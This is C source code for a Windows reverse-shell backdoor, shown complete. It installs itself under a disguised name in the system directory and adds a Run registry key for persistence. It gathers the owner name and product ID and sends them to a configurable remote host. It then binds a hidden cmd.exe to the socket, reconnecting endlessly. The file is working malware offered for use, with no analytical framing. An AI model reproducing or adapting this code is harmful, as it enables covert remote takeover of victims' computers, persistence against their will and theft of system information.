#include <stdio.h>
#include <winsock2.h>
#include <winsock.h>
#include <windows.h>
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"wsock32.lib ")

//Settings (Change Them Accordingly)
#define remHOST "localhost" //Server IP (nc -l -p <remPort>
#define remPORT 80 //Server Port
#define magicKey "2600" //Pass Key to Start the Shell

//Variable Declarations;
struct sockaddr_in sockMain_In;
WSADATA wsaData;
SOCKET sockMain;
SOCKET Sock;
STARTUPINFO sInfo;
PROCESS_INFORMATION pInfo;
HOSTENT* hostAddr=NULL;
HANDLE revThread;
HANDLE mutexHandle;
char *szIp;
char szMagic[MAX_PATH];
char szCompID[MAX_PATH];
int retVal;
int nChar;

//Install The Shell to Survive Boots
void InstallMe(char *szInstallName)
{
     HKEY hkeyReg;
     DWORD lenOfValue;
     char szValue[MAX_PATH];
     RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&hkeyReg);
     if(RegQueryValueEx(hkeyReg,szInstallName,0,NULL,szValue,&lenOfValue)!=ERROR_SUCCESS)
     {
           char szAppPath[MAX_PATH];
	       char szSystemPath[MAX_PATH];
	       GetModuleFileName(GetModuleHandle(NULL),szAppPath,MAX_PATH);
	       GetSystemDirectory(szSystemPath,MAX_PATH);
	       strcat(szSystemPath,"\\");
	       strcat(szSystemPath,szInstallName);
	       strcat(szSystemPath,".exe");
	       CopyFile(szAppPath,szSystemPath,1);
	       RegSetValueEx(hkeyReg,szInstallName,0,REG_SZ,szSystemPath,strlen(szSystemPath));
     }
     RegCloseKey(hkeyReg);
}
    
//Generate a CompID
void GetCompID(char *lpszBuf)
{
    HKEY hKey;
	char szOwner[30];
	char szProductID[30];
	DWORD valueType;
	DWORD valueSize;
	valueSize = 30;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
					"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
					0,
					KEY_READ,
					&hKey);
	//get owner name
	RegQueryValueEx(hKey,
					"RegisteredOwner",
					NULL,
					&valueType,
					(LPBYTE)szOwner,
					&valueSize);
	valueSize = 30;
	//get product ID
	RegQueryValueEx(hKey,
					"ProductId",
					NULL,
					&valueType,
					(LPBYTE)szProductID,
					&valueSize);

	RegCloseKey(hKey);
	//concatenate both id in form of ownername[productid]
	sprintf(lpszBuf, "<compID>%s[%s]", szOwner, szProductID);
}

//Mutex for Only One Instance
int OnlyOne(char *szMutex)
{
	mutexHandle=CreateMutex(NULL,TRUE,szMutex);
	if( GetLastError ()==ERROR_ALREADY_EXISTS)
	return 1;
	return 0;
}
//Format Revd String
char chop(char *variable)
{
	char *tmp;
	unsigned int i;
	tmp=(char *) malloc(strlen(variable)*sizeof(char));
	strcpy(tmp,variable);
	for(i=0;i<strlen(tmp)-1;i++)
	{
		variable[i]=tmp[i];
		variable[i+1]='\0';
	}
	return tmp[strlen(tmp)];
}
//Main Reverse Shell
int ReverseShell(char *szHostName,short shortPort)
{
    while(TRUE)
    {
               WSAStartup(MAKEWORD(2,2), &wsaData);//Socket Startup
               sockMain=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);//Create The Socket
			   retVal=SOCKET_ERROR;
			   
			   while(retVal ==SOCKET_ERROR)
			   {
				   hostAddr=gethostbyname(szHostName);
				   if(hostAddr !=NULL)
				   {
					   szIp=inet_ntoa(*(struct in_addr *)*hostAddr->h_addr_list);
					   sockMain_In.sin_port=htons(shortPort);
                       sockMain_In.sin_family=AF_INET;
				       sockMain_In.sin_addr.s_addr=inet_addr(szIp);
	                }
	                retVal=WSAConnect(sockMain,(SOCKADDR*)&sockMain_In,sizeof(sockMain_In),NULL,NULL,NULL,NULL);
			   }
			   //Test MagicKey
			   //send(sockMain,"Enter the Magic Word = ",strlen("Enter the Magic Word = "),0);
               //nChar=recv(sockMain,szMagic,MAX_PATH,0);chop(szMagic);
               //szMagic[nChar]='\0';
               //if (strcmp(szMagic,magicKey)!=0)
               //goto cleanup;
               //Confirm Shell
               //send(sockMain,"Welcome\n",strlen("Welcome\n"),0);
               //Start Shell
               send(sockMain,szCompID,strlen(szCompID),0);//SendCompID
	           memset(&sInfo,0,sizeof(sInfo));
	           sInfo.cb=sizeof(sInfo);
	           sInfo.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
			   sInfo.wShowWindow =SW_HIDE;
	           sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)sockMain;
	           CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&sInfo,&pInfo);
	           WaitForSingleObject(pInfo.hProcess,INFINITE);
	           //Cleanup The Socket
	           cleanup:
	           WSACleanup();
	           closesocket(sockMain);
    }
    return 0;
    
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine,int nShowCmd)
{
    //HWND mainWIN;
    //mainWIN=FindWindowA("ConsoleWindowClass",NULL);
   // ShowWindow(mainWIN,SW_HIDE);//HIDE-ME
    //ShowWindow(GetForegroundWindow(),SW_HIDE);
    if(OnlyOne("4e5934879"))
	return 0;//Verify Only One Instance Running
	InstallMe("help-676474");
	GetCompID(szCompID);
    ReverseShell(remHOST,remPORT);//ReverseShell :)
    return 0;
}


